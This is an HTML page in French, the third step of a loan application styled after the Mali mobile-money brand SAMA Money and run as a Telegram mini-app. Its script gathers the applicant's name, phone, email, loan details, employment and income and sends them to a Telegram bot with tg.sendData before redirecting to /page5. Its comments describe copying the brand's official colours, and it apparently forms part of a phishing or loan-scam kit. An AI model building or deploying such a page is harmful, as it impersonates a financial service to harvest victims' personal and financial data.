<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SAMA Money Mali - Demande de Prêt (Résumé)</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            /* Couleurs officielles de l'application SAMA Money (Mali) */
            --sama-blue: #0055A5;          /* Bleu principal SAMA Money */
            --sama-blue-dark: #003E7E;     /* Bleu foncé au survol/clic */
            --sama-navy: #0A2540;          /* Bleu nuit pour les titres/accents */
            --sama-gold: #F5A623;          /* Jaune/Or signature SAMA Money */
            --bg-color: #F4F7FA;           /* Fond gris-bleu très clair */
            --card-bg: #FFFFFF;
            --text-main: #0A2540;
            --text-muted: #5A6B7C;
            --input-border: #C5DDF5;
            --btn-gray: #E9F1F8;
            --btn-gray-text: #2C4A6F;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Barre de navigation supérieure - Bleu SAMA Money */
        .app-header {
            width: 100%;
            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
            height: 62px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(0, 85, 165, 0.2);
            border-bottom: 3px solid var(--sama-gold);
        }

        .back-btn-top {
            color: #ffffff;
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            font-size: 21px;
            font-weight: 900;
            letter-spacing: 0.3px;
            color: #ffffff;
        }

        .header-title .brand-sama {
            color: #ffffff;
        }

        .header-title .brand-money {
            color: var(--sama-gold);
            margin-left: 4px;
        }

        .header-title .region {
            color: var(--sama-navy);
            font-size: 11px;
            margin-left: 6px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--sama-gold);
            padding: 2px 6px;
            border-radius: 4px;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: #ffffff;
            border-radius: 2px;
        }

        /* Carte principale */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 20px;
            box-shadow: 0 6px 25px rgba(10, 37, 64, 0.07);
            border: 1px solid #E3ECF5;
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 25px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 13px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 24px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* Barre de progression des étapes (Toutes les 3 étapes actives) */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 0 auto 32px;
            width: 100%;
        }

        .step-bar {
            flex: 1;
            height: 6px;
            background-color: #D6E4F0;
            border-radius: 3px;
        }

        .step-bar.active {
            background: linear-gradient(90deg, var(--sama-blue), var(--sama-gold));
        }

        /* Champs du formulaire */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 14px;
            font-weight: 700;
            color: var(--sama-navy);
            margin-bottom: 8px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #0A2540;
            outline: none;
            width: 100%;
            transition: border-color 0.2s;
        }

        .form-control::placeholder {
            color: #8FA3BE;
        }

        .form-control:focus {
            border-color: var(--sama-blue);
        }

        select.form-control {
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%230055A5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 16px center;
            background-size: 14px;
            padding-right: 40px;
            cursor: pointer;
        }

        /* Bloc récapitulatif avec bordure et accent SAMA Money */
        .summary-card {
            background-color: #EEF5FC;
            border-left: 4px solid var(--sama-blue);
            padding: 18px 16px;
            border-radius: 12px;
            margin: 10px 0 24px;
            border-top: 1px solid #C5DDF5;
            border-right: 1px solid #C5DDF5;
            border-bottom: 1px solid #C5DDF5;
        }

        .summary-card h3 {
            margin: 0 0 14px 0;
            font-size: 15px;
            font-weight: 800;
            color: var(--sama-navy);
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            padding-bottom: 8px;
            border-bottom: 1px dashed #C5DDF5;
        }

        .summary-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .summary-label {
            color: var(--text-muted);
            font-size: 13.5px;
            font-weight: 500;
        }

        .summary-value {
            font-weight: 700;
            font-size: 13.5px;
            color: var(--sama-navy);
            text-align: right;
        }

        /* Conteneur de boutons */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 10px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-prev:hover {
            background-color: #D6E4F0;
        }

        .btn-next {
            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
            color: #ffffff;
            border: none;
            border-bottom: 3px solid var(--sama-gold);
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: all 0.2s ease;
            box-shadow: 0 4px 14px rgba(0, 85, 165, 0.3);
        }

        .btn-next:active {
            background: var(--sama-blue-dark);
            transform: scale(0.99);
        }

        /* Pied de page */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: var(--text-muted);
            margin-top: auto;
        }
    </style>
</head>

<body>

<!-- Barre de navigation supérieure SAMA Money -->
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Retour</a>
    <div class="header-title">
        <span class="brand-sama">SAMA</span><span class="brand-money">Money</span><span class="region">Mali</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 3 sur 3</div>

    <!-- Indicateurs de progression (3 étapes actives) -->
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
    </div>

    <!-- Formulaire et Résumé Dynamique -->
    <form id="step3Form" onsubmit="submitForm(event)">
        <div class="form-group">
            <label for="jobStatus">Situation Professionnelle</label>
            <select id="jobStatus" class="form-control" required>
                <option value="Salarié(e)" selected>Salarié(e)</option>
                <option value="Entrepreneur / Commerçant(e)">Entrepreneur / Commerçant(e)</option>
                <option value="Étudiant(e)">Étudiant(e)</option>
                <option value="Sans emploi">Sans emploi</option>
                <option value="Retraité(e)">Retraité(e)</option>
            </select>
        </div>

        <div class="form-group">
            <label for="income">Revenu Mensuel Moyen (FCFA)</label>
            <input type="number" id="income" class="form-control" placeholder="ex. : 150000" required>
        </div>

        <div class="summary-card">
            <h3>Résumé de la Demande</h3>

            <div class="summary-row">
                <span class="summary-label">Montant du prêt :</span>
                <span class="summary-value" id="sumAmount">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Durée du prêt :</span>
                <span class="summary-value" id="sumDuration">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Motif du prêt :</span>
                <span class="summary-value" id="sumPurpose">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Demandeur :</span>
                <span class="summary-value" id="sumName">--</span>
            </div>

            <div class="summary-row">
                <span class="summary-label">Numéro de téléphone :</span>
                <span class="summary-value" id="sumPhone">--</span>
            </div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
            <button type="submit" class="btn-next">SOUMETTRE LA DEMANDE</button>
        </div>
    </form>
</div>

<!-- Pied de page -->
<div class="footer-banner">
    © 2026 SAMA Money - Mali
</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();   
        tg.expand();
    }

    // Récupération des données enregistrées des étapes 1 et 2
    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";
    const phone = localStorage.getItem('phone') || "";

    // Formatage et affichage du résumé avec la devise FCFA (séparation par espaces)
    if (amount) {
        const numAmount = Number(amount.replace(/\D/g, ''));
        document.getElementById('sumAmount').innerText = numAmount 
            ? `${numAmount.toLocaleString('fr-FR').replace(/\u202f/g, ' ')} FCFA` 
            : `${amount} FCFA`;
    } else {
        document.getElementById('sumAmount').innerText = "--";
    }

    document.getElementById('sumDuration').innerText = term ? term : "--";
    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
    document.getElementById('sumPhone').innerText = phone ? `+223 ${phone}` : "--";
};

function submitForm(event) {
    event.preventDefault();
    const tg = window.Telegram?.WebApp;
    const incomeVal = document.getElementById('income').value.trim();

    if (!incomeVal) {
        alert("Veuillez entrer votre revenu mensuel moyen.");
        return;
    }

    const data = {
        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        email: localStorage.getItem('email'),
        phone: localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: incomeVal,
        currency: "FCFA"
    };

    // Enregistrement des détails de profil finaux
    localStorage.setItem('jobStatus', data.jobStatus);
    localStorage.setItem('income', incomeVal);

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 300);
    } else {
        console.log("Données soumises :", data);
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
